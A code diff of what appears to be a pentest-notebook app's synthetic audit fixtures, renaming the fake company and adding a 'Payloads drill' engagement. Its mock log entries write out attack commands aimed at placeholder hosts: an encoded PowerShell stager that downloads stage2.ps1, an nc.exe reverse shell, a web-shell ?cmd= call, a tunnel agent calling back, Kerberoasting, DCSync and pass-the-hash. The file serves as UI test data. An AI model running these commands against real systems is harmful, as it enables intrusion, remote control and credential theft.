@@ -1,13 +1,14 @@
-// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, 10.10.x.x / 172.16.x.x
-// addresses and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
-import type { AccessGrant, CredAttempt, Credential, Username } from "../types/credentials";
+// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, invented 10.10.x.x target
+// addresses, RFC 5737 addresses (192.0.2.10 for the attacker; 198.51.100.x and example.test for the Payloads drill)
+// and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
+import type { AccessGrant, CredAttempt, Credential, TriedPair, Username } from "../types/credentials";
 import type { ChecklistItem } from "../types/checklist";
 import type { CleanupItem } from "../types/cleanup";
 import type { BackupInfo } from "../types/backup";
 import type { Engagement } from "../types/engagement";
 import type { FailedAttempt, Finding, FindingFile } from "../types/findings";
 import type { Host } from "../types/host";
-import type { Attachment, LogEntry, Progress } from "../types/log";
+import type { Attachment, Extraction, LogEntry, Progress } from "../types/log";
 import type { HostIdentity, PrivescVector } from "../types/hostFacts";
 import type { Hop, Tunnel } from "../types/network";
 import type { Note, RuledOut } from "../types/notes";
@@ -23,6 +24,9 @@ export const AUDIT_IDS = {
   dcHost: "h-dc01",
   fileHost: "h-fs01",
   msfHost: "h-exam-ms01",
+  payloadsEngagement: "e-pay",
+  iisHost: "h-pay-iis",
+  pgHost: "h-pay-pg",
 } as const;
 
 /** 2026-11-05 14:00 UTC. The browser clock is frozen here when auditing. */
@@ -48,6 +52,8 @@ export interface AuditFixtures {
   credentials: Credential[];
   usernames: Username[];
   credAttempts: CredAttempt[];
+  triedPairs: TriedPair[];
+  extractions: Extraction[];
   accessGrants: AccessGrant[];
   findings: Finding[];
   findingFiles: FindingFile[];
@@ -59,26 +65,34 @@ export interface AuditFixtures {
 
 // ---------------------------------------------------------------- engagements
 
-const LAB_NAME = "Lumen Corp — internal segment B (10.10.20.0/24) with the long-named finance DMZ";
+const LAB_NAME = "Acme Corp — internal segment B (10.10.20.0/24) with the long-named finance DMZ";
 
 const engagements: Engagement[] = [
   {
     id: "e-lab", name: LAB_NAME, kind: "lab", client: null, subLabel: "PEN-200 lab, challenge 3 (long-running)",
-    scopeCidrs: ["10.10.20.0/24", "10.10.21.0/24"], domain: "lumen.corp", startsAt: null, endsAt: null,
+    scopeCidrs: ["10.10.20.0/24", "10.10.21.0/24"], domain: "acme.corp", startsAt: null, endsAt: null,
     timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: ago(72 * HOUR), updatedAt: ago(5 * MIN),
     lastActivityAt: ago(5 * MIN), lastRanOn: "Kali (VM)", msfHostId: null,
   },
   {
-    id: "e-exam", name: "OSCP mock exam 2", kind: "exam-sim", client: null, subLabel: "Set B",
+    id: "e-exam", name: "Mock exam 2", kind: "exam-sim", client: null, subLabel: "Set B",
     scopeCidrs: ["10.10.30.0/24"], domain: "exam.corp", startsAt: null, endsAt: null,
     timeboxStart: ago(3 * HOUR), timeboxMinutes: 1425, status: "active", createdAt: ago(3 * HOUR),
     updatedAt: ago(20 * MIN), lastActivityAt: ago(20 * MIN), lastRanOn: "Kali (VM)", msfHostId: "h-exam-ms01",
   },
   {
     id: "e-old", name: "Contoso web assessment", kind: "client", client: "Contoso Ltd", subLabel: null,
-    scopeCidrs: ["172.16.5.0/24"], domain: null, startsAt: ago(40 * 24 * HOUR), endsAt: ago(30 * 24 * HOUR),
+    scopeCidrs: ["10.60.5.0/24"], domain: null, startsAt: ago(40 * 24 * HOUR), endsAt: ago(30 * 24 * HOUR),
     timeboxStart: null, timeboxMinutes: null, status: "archived", createdAt: ago(45 * 24 * HOUR),
     updatedAt: ago(29 * 24 * HOUR), lastActivityAt: ago(30 * 24 * HOUR), lastRanOn: null, msfHostId: null,
+  },
+  // Payloads: RFC 5737 addresses and example.test names only. Older than e-lab, so /arsenal and /payloads still
+  // default to e-lab when opened directly.
+  {
+    id: "e-pay", name: "Payloads drill", kind: "lab", client: null, subLabel: null,
+    scopeCidrs: ["198.51.100.0/24"], domain: "example.test", startsAt: null, endsAt: null,
+    timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: ago(48 * HOUR), updatedAt: ago(24 * HOUR),
+    lastActivityAt: ago(24 * HOUR), lastRanOn: "Kali (VM)", msfHostId: null,
   },
 ];
 
@@ -90,7 +104,7 @@ const host = (id: string, engagementId: string, name: string, ip: string, os: Ho
   adSet: null, adSetEffective: false, ...over,
 });
 
-const WEB_NAME = "web-finance-dmz-portal-01.dmz.finance.lumen.corp";
+const WEB_NAME = "web-portal-dmz-frontend-01.dmz.acme.corp";
 
 const hosts: Host[] = [
   host("h-web", "e-lab", WEB_NAME, "10.10.20.15", "linux", { boardColumn: "vulnerability-detection", access: "user", boardDerived: "vulnerability-detection" }),
@@ -104,7 +118,10 @@ const hosts: Host[] = [
   host("h-exam-ad02", "e-exam", "ad02", "10.10.30.11", "windows", { adSet: true, adSetEffective: true, boardColumn: "vulnerability-detection" }),
   host("h-exam-web", "e-exam", "web01", "10.10.30.20", "linux", { boardColumn: "privilege-escalation", access: "user" }),
   host("h-exam-lnx", "e-exam", "lnx02", "10.10.30.21", "linux"),
-  host("h-old-1", "e-old", "shop.contoso.example", "172.16.5.10", "linux", { boardColumn: "reporting", access: "root" }),
+  // A long name, so the drawer's host chip is at its widest next to "Paste into Web shell ?cmd=".
+  host("h-pay-iis", "e-pay", "intranet-gateway-iis-frontend-07.corp.example.test", "198.51.100.20", "windows", { boardColumn: "initial-foothold", access: "user" }),
+  host("h-pay-pg", "e-pay", "pg01.example.test", "198.51.100.30", "linux"),
+  host("h-old-1", "e-old", "shop.contoso.example", "10.60.5.10", "linux", { boardColumn: "reporting", access: "root" }),
 ];
 
 // ---------------------------------------------------------------- services
@@ -149,7 +166,7 @@ const services: Service[] = [
   svc("h-dc01", 53, "domain", "Simple DNS Plus"),
   svc("h-dc01", 88, "kerberos-sec", "Microsoft Windows Kerberos", confirmed("Microsoft Kerberos", null)),
   svc("h-dc01", 135, "msrpc", "Microsoft Windows RPC"),
-  svc("h-dc01", 389, "ldap", "Microsoft Windows Active Directory LDAP (Domain: lumen.corp)", confirmed("Active Directory LDAP", null)),
+  svc("h-dc01", 389, "ldap", "Microsoft Windows Active Directory LDAP (Domain: acme.corp)", confirmed("Active Directory LDAP", null)),
   svc("h-dc01", 445, "microsoft-ds?", null),
   svc("h-dc01", 636, "ssl/ldap", "Microsoft Windows Active Directory LDAP"),
   svc("h-dc01", 3268, "ldap", "Microsoft Windows Active Directory LDAP"),
@@ -187,22 +204,26 @@ const services: Service[] = [
   svc("h-exam-web", 22, "ssh", "OpenSSH 8.2p1"),
   svc("h-exam-web", 80, "http", "Apache httpd 2.4.41", confirmed("Apache httpd", "2.4.41")),
   svc("h-exam-lnx", 22, "ssh", "OpenSSH 7.6p1"),
+  svc("h-pay-iis", 80, "http", "Microsoft IIS httpd 10.0", confirmed("IIS", "10.0")),
+  svc("h-pay-iis", 445, "microsoft-ds?", null),
+  svc("h-pay-pg", 22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6"),
+  svc("h-pay-pg", 5432, "postgresql", "PostgreSQL DB 14.10 - 14.11"),
   svc("h-old-1", 443, "ssl/http", "nginx 1.22.1"),
 ];
 
 // ---------------------------------------------------------------- log
 
-const BLOB = btoa("IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/stage2.ps1'); Invoke-Beacon -Sleep 30 ".repeat(5)).slice(0, 372);
+const BLOB = btoa("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1'); Invoke-Beacon -Sleep 30 ".repeat(5)).slice(0, 372);
 const LONG_ONE_LINER = `powershell.exe -nop -w hidden -ep bypass -enc ${BLOB}`;
-const LONG_PATH = String.raw`C:\Program Files (x86)\Lumen Corp\Finance Suite\Reporting Services\Deployment\Config\Prod\connection.config`;
+const LONG_PATH = String.raw`C:\Program Files (x86)\Acme Corp\Finance Suite\Reporting Services\Deployment\Config\Prod\connection.config`;
 const SHORT_FLAGS = "rustscan --ulimit=5000 --range=1-65535";
 const MULTILINE_OUTPUT = [
   "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-05 13:12 UTC",
-  "Nmap scan report for web-finance-dmz-portal-01.dmz.finance.lumen.corp (10.10.20.15)",
+  "Nmap scan report for web-portal-dmz-frontend-01.dmz.acme.corp (10.10.20.15)",
   "PORT     STATE SERVICE     VERSION",
   "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)",
   "80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))",
-  "|_http-title: Lumen Finance Portal | Sign in to continue to the reporting dashboard and monthly statements",
+  "|_http-title: Acme Finance Portal | Sign in to continue to the reporting dashboard and monthly statements",
   "445/tcp  open  netbios-ssn Samba smbd 4.6.2",
   "3306/tcp open  mysql       MySQL 8.0.36-0ubuntu0.22.04.1",
   "",
@@ -230,20 +251,20 @@ const labLog: LogEntry[] = [
   cmd("Full TCP scan of the web host", "nmap -p- -sV -sC -T4 10.10.20.15 -oA scans/web-full", MULTILINE_OUTPUT),
   cmd("Fast port sweep (short flags)", SHORT_FLAGS, "Open 10.10.20.15:22\nOpen 10.10.20.15:80\nOpen 10.10.20.15:445"),
   cmd("Encoded PowerShell stager", LONG_ONE_LINER, "", ["h-fs01"], { returnedNothing: true, observations: "No callback; AMSI likely blocked the download cradle." }),
-  cmd("Read the finance connection string", `type "${LONG_PATH}"`, `<connectionStrings>\n  <add name="Finance" connectionString="Server=sql01.lumen.corp;Database=Finance;User Id=svc_report;Password=Password123!;" />\n</connectionStrings>`, ["h-fs01"]),
-  cmd("SMB share listing on dc01", "nxc smb 10.10.20.10 -u svc_backup -p 'Password123!' --shares", "SMB  10.10.20.10  445  DC01  [+] lumen.corp\\svc_backup:Password123!\nSMB  10.10.20.10  445  DC01  Share      Permissions  Remark\nSMB  10.10.20.10  445  DC01  SYSVOL     READ         Logon server share", ["h-dc01"]),
-  cmd("Kerberoast", "impacket-GetUserSPNs lumen.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request", "ServicePrincipalName  Name     MemberOf\nMSSQLSvc/sql01.lumen.corp:1433  svc_sql  CN=Domain Users", ["h-dc01", "h-sql01"]),
+  cmd("Read the finance connection string", `type "${LONG_PATH}"`, `<connectionStrings>\n  <add name="Finance" connectionString="Server=sql01.acme.corp;Database=Finance;User Id=svc_report;Password=Password123!;" />\n</connectionStrings>`, ["h-fs01"]),
+  cmd("SMB share listing on dc01", "nxc smb 10.10.20.10 -u svc_backup -p 'Password123!' --shares", "SMB  10.10.20.10  445  DC01  [+] acme.corp\\svc_backup:Password123!\nSMB  10.10.20.10  445  DC01  Share      Permissions  Remark\nSMB  10.10.20.10  445  DC01  SYSVOL     READ         Logon server share", ["h-dc01"]),
+  cmd("Kerberoast", "impacket-GetUserSPNs acme.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request", "ServicePrincipalName  Name     MemberOf\nMSSQLSvc/sql01.acme.corp:1433  svc_sql  CN=Domain Users", ["h-dc01", "h-sql01"]),
   cmd("Crack the TGS hash", "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt", "Status...........: Cracked\nRecovered........: 1/1 (100.00%) Digests", ["h-sql01"]),
-  cmd("DCSync", "impacket-secretsdump -just-dc lumen.corp/Administrator@10.10.20.10 -hashes :aad3b435b51404eeaad3b435b51404ee", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::", ["h-dc01"]),
+  cmd("DCSync", "impacket-secretsdump -just-dc acme.corp/Administrator@10.10.20.10 -hashes :aad3b435b51404eeaad3b435b51404ee", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::", ["h-dc01"]),
   cmd("Web directory brute force", "feroxbuster -u http://10.10.20.15 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt -t 50", "200  GET  1l  1w  12c  http://10.10.20.15/\n301  GET  9l  28w  315c  http://10.10.20.15/admin\n403  GET  9l  28w  277c  http://10.10.20.15/server-status"),
   cmd("Anonymous FTP check", "ftp 10.10.20.15", "Connected to 10.10.20.15.\n220 (vsFTPd 3.0.3)\nName: anonymous\n530 Login incorrect.", ["h-web"], { returnedNothing: true }),
-  cmd("Tunnel agent start", "./agent -connect 10.10.14.7:11601 -ignore-cert", "INFO[0000] Connection established  addr=\"10.10.14.7:11601\"", ["h-pivot"]),
+  cmd("Tunnel agent start", "./agent -connect 192.0.2.10:11601 -ignore-cert", "INFO[0000] Connection established  addr=\"192.0.2.10:11601\"", ["h-pivot"]),
   cmd("Second subnet sweep through the tunnel", "nmap -sn 10.10.21.0/24", "Nmap scan report for 10.10.21.4\nNmap scan report for 10.10.21.9", ["h-pivot"]),
-  cmd("MSSQL xp_cmdshell", "impacket-mssqlclient lumen.corp/svc_sql:'Password123!'@10.10.20.22 -windows-auth", "SQL> EXEC xp_cmdshell 'whoami'\nlumen\\svc_sql", ["h-sql01"]),
-  cmd("WinRM shell on dc01", "evil-winrm -i 10.10.20.10 -u Administrator -H 0123456789abcdef0123456789abcdef", "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nlumen\\administrator", ["h-dc01"]),
+  cmd("MSSQL xp_cmdshell", "impacket-mssqlclient acme.corp/svc_sql:'Password123!'@10.10.20.22 -windows-auth", "SQL> EXEC xp_cmdshell 'whoami'\nacme\\svc_sql", ["h-sql01"]),
+  cmd("WinRM shell on dc01", "evil-winrm -i 10.10.20.10 -u Administrator -H 0123456789abcdef0123456789abcdef", "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nacme\\administrator", ["h-dc01"]),
   cmd("SNMP walk", "snmpwalk -v2c -c public 10.10.20.15 1.3.6.1.2.1.25.4.2.1.2", "iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: \"systemd\"\niso.3.6.1.2.1.25.4.2.1.2.412 = STRING: \"apache2\"", ["h-web"]),
-  cmd("Reverse shell listener", "rlwrap nc -lvnp 4444", "listening on [any] 4444 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.20.15] 51514\nwww-data@web:/var/www/html$", ["h-web"]),
-  entry({ kind: "http", title: "Login request with an oversized JWT cookie", hostIds: ["h-web"], content: { kind: "http", request: `GET /admin/reports?month=2026-10&format=csv&token=${BLOB} HTTP/1.1\nHost: web-finance-dmz-portal-01.dmz.finance.lumen.corp\nCookie: session=${BLOB.slice(0, 120)}\n\n`, response: "HTTP/1.1 403 Forbidden\nContent-Type: text/html\nContent-Length: 277\n\n<h1>Forbidden</h1>" } }),
+  cmd("Reverse shell listener", "rlwrap nc -lvnp 4444", "listening on [any] 4444 ...\nconnect to [192.0.2.10] from (UNKNOWN) [10.10.20.15] 51514\nwww-data@web:/var/www/html$", ["h-web"]),
+  entry({ kind: "http", title: "Login request with an oversized JWT cookie", hostIds: ["h-web"], content: { kind: "http", request: `GET /admin/reports?month=2026-10&format=csv&token=${BLOB} HTTP/1.1\nHost: web-portal-dmz-frontend-01.dmz.acme.corp\nCookie: session=${BLOB.slice(0, 120)}\n\n`, response: "HTTP/1.1 403 Forbidden\nContent-Type: text/html\nContent-Length: 277\n\n<h1>Forbidden</h1>" } }),
   entry({ kind: "http", title: "Upload form probe", hostIds: ["h-web"], content: { kind: "http", request: "POST /upload HTTP/1.1\nHost: 10.10.20.15\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"f\"; filename=\"a.php\"\n\n<?php echo 1;\n--x--", response: null } }),
   note("A very long note title that keeps going to see how the log row handles a heading with no natural break points at all", "Found the finance DMZ gateway. It has a second NIC on 10.10.21.0/24 which is not in scope yet; confirm with the lab guide before touching it.", ["h-pivot"]),
   note("Password reuse theory", "svc_backup and svc_report share a password pattern: Season+Year+!. Try it against the other service accounts.", [], { private: true }),
@@ -254,8 +275,8 @@ const labLog: LogEntry[] = [
   shot("tall", "Long tool output captured top to bottom", ["h-dc01"]),
   shot("hd", "Desktop of the file server", ["h-fs01"]),
   shot("tiny", "Cropped proof of the hostname", ["h-dc01"]),
-  cmd("Local administrators on fs01", "net localgroup administrators", "Alias name     administrators\nMembers\n---\nAdministrator\nLUMEN\\Domain Admins\nLUMEN\\svc_backup", ["h-fs01"]),
-  cmd("Share with a long UNC path", "dir \\\\fs01.lumen.corp\\Finance$\\Quarterly Reports\\2026\\Q3\\Board Pack — Draft v7 (Reviewed by Legal).xlsx", " Volume in drive \\\\fs01 has no label.\n 11/04/2026  09:14 AM    18,204,672 Board Pack — Draft v7 (Reviewed by Legal).xlsx", ["h-fs01"]),
+  cmd("Local administrators on fs01", "net localgroup administrators", "Alias name     administrators\nMembers\n---\nAdministrator\nACME\\Domain Admins\nACME\\svc_backup", ["h-fs01"]),
+  cmd("Share with a long UNC path", "dir \\\\fs01.acme.corp\\Finance$\\Quarterly Reports\\2026\\Q3\\Board Pack — Draft v7 (Reviewed by Legal).xlsx", " Volume in drive \\\\fs01 has no label.\n 11/04/2026  09:14 AM    18,204,672 Board Pack — Draft v7 (Reviewed by Legal).xlsx", ["h-fs01"]),
 ];
 
 const examLog: LogEntry[] = [
@@ -264,7 +285,21 @@ const examLog: LogEntry[] = [
   cmd("Web enumeration", "gobuster dir -u http://10.10.30.20 -w common.txt", "/admin (Status: 301)", ["h-exam-web"], { engagementId: "e-exam", at: ago(2 * HOUR) }),
 ].map((e, i) => ({ ...e, id: `l-exam-${i + 1}` }));
 
-const log: LogEntry[] = [...labLog, ...examLog];
+// The IIS host: a ?cmd= web shell that answers (so the paste context is "Web shell ?cmd="), then an nc.exe payload
+// logged from the drawer that failed there (so the misfit fold says "Failed here before").
+const payLog: LogEntry[] = [
+  cmd(
+    "Web shell answers", `curl "http://198.51.100.20/uploads/probe.aspx?cmd=whoami"`, "iis apppool\\defaultapppool", ["h-pay-iis"],
+    { engagementId: "e-pay", at: ago(26 * HOUR) },
+  ),
+  cmd(
+    "nc.exe -e · 198.51.100.20", "nc.exe 192.0.2.10 443 -e cmd.exe",
+    "'nc.exe' is not recognized as an internal or external command,\noperable program or batch file.", ["h-pay-iis"],
+    { engagementId: "e-pay", at: ago(25 * HOUR), payloadId: "nc-exe", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
+  ),
+].map((e, i) => ({ ...e, id: `l-pay-${i + 1}` }));
+
+const log: LogEntry[] = [...labLog, ...examLog, ...payLog];
 
 const attachments: Attachment[] = (Object.keys(AUDIT_PNGS) as (keyof typeof AUDIT_PNGS)[]).map((k) => ({
   id: `a-${k}`, mime: "image/png", dataBase64: AUDIT_PNGS[k].base64,
@@ -273,7 +308,7 @@ const attachments: Attachment[] = (Object.keys(AUDIT_PNGS) as (keyof typeof AUDI
 // ---------------------------------------------------------------- credentials (all domain scope, all newer than the done goal)
 
 const cred = (n: number, type: Credential["type"], username: string, secret: string, over: Partial<Credential> = {}): Credential => ({
-  id: `c-${n}`, engagementId: "e-lab", type, username, domain: "LUMEN", secret, hashType: null, scope: "domain",
+  id: `c-${n}`, engagementId: "e-lab", type, username, domain: "ACME", secret, hashType: null, scope: "domain",
   localHostId: null, sourceHostId: "h-dc01", source: null, notes: null, crackStatus: null, crackedFrom: null,
   fromSecretId: null, createdAt: ago((100 - n * 5) * MIN), updatedAt: ago((100 - n * 5) * MIN), ...over,
 });
@@ -289,14 +324,32 @@ const credentials: Credential[] = [
   cred(7, "hash", "j.harper", NT(0x71), { hashType: "NTLM", crackStatus: "uncracked", sourceHostId: "h-fs01" }),
   cred(8, "hash", "m.okafor", NT(0x82), { hashType: "NTLM", crackStatus: "cracked", sourceHostId: "h-fs01" }),
   cred(9, "password", "m.okafor", "Autumn2026#", { sourceHostId: "h-fs01", fromSecretId: "c-8" }),
-  cred(10, "hash", "a.lindqvist-with-an-extraordinarily-long-service-account-name", NT(0x93), { hashType: "NTLM", crackStatus: "uncracked", domain: "LUMEN-FINANCE-DMZ" }),
+  cred(10, "hash", "a.lindqvist-with-an-extraordinarily-long-service-account-name", NT(0x93), { hashType: "NTLM", crackStatus: "uncracked", domain: "ACME-DMZ" }),
   cred(11, "password", "backup-operator", "Password123!", { notes: "Found in a sticky note file on the desktop." }),
   cred(12, "hash", "ws07$", `aad3b435b51404eeaad3b435b51404ee:${NT(0xa4)}`, { hashType: "pwdump", crackStatus: "uncrackable", sourceHostId: "h-ws07" }),
 ];
 
 const usernames: Username[] = [
-  { id: "u-1", engagementId: "e-lab", username: "j.harper", domain: "LUMEN", sourceHostId: "h-dc01", source: "rpcclient enumdomusers", createdAt: ago(80 * MIN) },
-  { id: "u-2", engagementId: "e-lab", username: "t.nakamura", domain: "LUMEN", sourceHostId: "h-dc01", source: "kerbrute", createdAt: ago(78 * MIN) },
+  { id: "u-1", engagementId: "e-lab", username: "j.harper", domain: "ACME", sourceHostId: "h-dc01", source: "rpcclient enumdomusers", createdAt: ago(80 * MIN) },
+  { id: "u-2", engagementId: "e-lab", username: "t.nakamura", domain: "ACME", sourceHostId: "h-dc01", source: "kerbrute", createdAt: ago(78 * MIN) },
+];
+
+const triedPairs: TriedPair[] = [
+  { id: "tp-1", engagementId: "e-lab", username: "drew", domain: "acme.corp", secret: "Guess1", secretKind: "password", hostId: "h-dc01", service: "smb", authMode: "domain", logEntryId: "l-5", at: ago(65 * MIN) },
+  { id: "tp-2", engagementId: "e-lab", username: "drew", domain: "acme.corp", secret: "Guess1", secretKind: "password", hostId: "h-fs01", service: "smb", authMode: "domain", logEntryId: "l-5", at: ago(65 * MIN) },
+];
+
+// One saved entry with an extraction, so the log's "Extracted" line has something to show.
+const extractions: Extraction[] = [
+  {
+    logEntryId: "l-5", engagementId: "e-lab", createdAt: ago(70 * MIN), undoneAt: null,
+    summary: { wins: ["svc_backup:Password123! works on SMB, DC01"], counts: ["+2 tried pairs"], ticks: [] },
+    record: {
+      createdHostIds: [], createdServiceIds: [], servicesBefore: [], hostOsBefore: [], identityBefore: [], createdCredentialIds: [], credentialsBefore: [],
+      createdUsernameIds: [], createdAttemptIds: [], attemptsBefore: [], createdTriedPairIds: ["tp-1", "tp-2"], createdVectorIds: [], outputTicks: [],
+      reprovedCredentialIds: [], reprovedUsernameIds: [],
+    },
+  },
 ];
 
 const credAttempts: CredAttempt[] = [
@@ -319,7 +372,7 @@ const findings: Finding[] = [
     id: "f-1", engagementId: "e-lab", title: "Domain compromise via Kerberoastable service account with a weak password", severity: "critical",
     cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", cvssScore: 9.9, status: "confirmed",
     description: "svc_sql has an SPN and a password found in rockyou.txt. Cracking its ticket gave a foothold that led to Domain Admin.",
-    impact: "Full control of lumen.corp.", remediation: "Use gMSA or 25+ character random passwords for service accounts.",
+    impact: "Full control of acme.corp.", remediation: "Use gMSA or 25+ character random passwords for service accounts.",
     exploitNotes: "GetUserSPNs then hashcat -m 13100.", lessons: "Check SPNs earlier.", refs: ["https://attack.mitre.org/techniques/T1558/003/"],
     hostIds: ["h-dc01", "h-sql01"], serviceIds: [], stepEntryIds: ["l-6", "l-7", "l-13", "l-8", "l-14", "l-23"], createdAt: ago(30 * MIN), updatedAt: ago(20 * MIN),
   },
@@ -341,7 +394,7 @@ const findings: Finding[] = [
 ];
 
 const findingFiles: FindingFile[] = [
-  { id: "ff-1", findingId: "f-1", name: "kerberoast.sh", language: "bash", content: "#!/bin/sh\nimpacket-GetUserSPNs lumen.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request\n", createdAt: ago(20 * MIN), updatedAt: ago(20 * MIN) },
+  { id: "ff-1", findingId: "f-1", name: "kerberoast.sh", language: "bash", content: "#!/bin/sh\nimpacket-GetUserSPNs acme.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request\n", createdAt: ago(20 * MIN), updatedAt: ago(20 * MIN) },
 ];
 
 const failedAttempts: FailedAttempt[] = [
@@ -368,7 +421,7 @@ const vectors: PrivescVector[] = [
 // ---------------------------------------------------------------- network, notes, cleanup
 
 const tunnels: Tunnel[] = [
-  { id: "t-1", engagementId: "e-lab", kind: "ligolo", viaHostId: "h-pivot", subnets: ["10.10.21.0/24", "10.10.22.0/24"], callbackIp: "10.10.14.7", status: "up", notes: "ligolo-ng agent, tun interface ligolo", createdAt: ago(50 * MIN), updatedAt: ago(50 * MIN) },
+  { id: "t-1", engagementId: "e-lab", kind: "ligolo", viaHostId: "h-pivot", subnets: ["10.10.21.0/24", "10.10.22.0/24"], callbackIp: "192.0.2.10", status: "up", notes: "ligolo-ng agent, tun interface ligolo", createdAt: ago(50 * MIN), updatedAt: ago(50 * MIN) },
 ];
 
 const hops: Hop[] = [
@@ -406,6 +459,7 @@ const progress: Record<string, Progress> = {
   "e-lab": { hostsTotal: 6, hostsRooted: 2, flagsFound: 2, flagsTotal: 12 },
   "e-exam": { hostsTotal: 5, hostsRooted: 0, flagsFound: 1, flagsTotal: 6 },
   "e-old": { hostsTotal: 1, hostsRooted: 1, flagsFound: 2, flagsTotal: 2 },
+  "e-pay": { hostsTotal: 2, hostsRooted: 0, flagsFound: 0, flagsTotal: 4 },
 };
 
 const backups: BackupInfo[] = [
@@ -414,14 +468,14 @@ const backups: BackupInfo[] = [
 ];
 
 const settings: Settings = {
-  autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)", "Windows 11 (VM)"], attackerIp: "10.10.14.7",
+  autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)", "Windows 11 (VM)"], attackerIp: "192.0.2.10",
   listenerPort: "4444", kaliUser: "audit", windowsToolsDir: "~/tools/windows", linuxToolsDir: "/opt/tools",
   fieldManualPath: "/Users/audit/Documents/Field-Manual", nvdKeySet: true,
 };
 
 export const FIXTURES: AuditFixtures = {
   engagements, hosts, services, log, attachments, checklist, notes, ruledOut, hostIdentity, vectors, tunnels, hops, credentials, usernames,
-  credAttempts, accessGrants, findings, findingFiles, failedAttempts, cleanup, backups, settings,
+  credAttempts, triedPairs, extractions, accessGrants, findings, findingFiles, failedAttempts, cleanup, backups, settings,
 };
 
 export const FIXTURE_PROGRESS = progress;
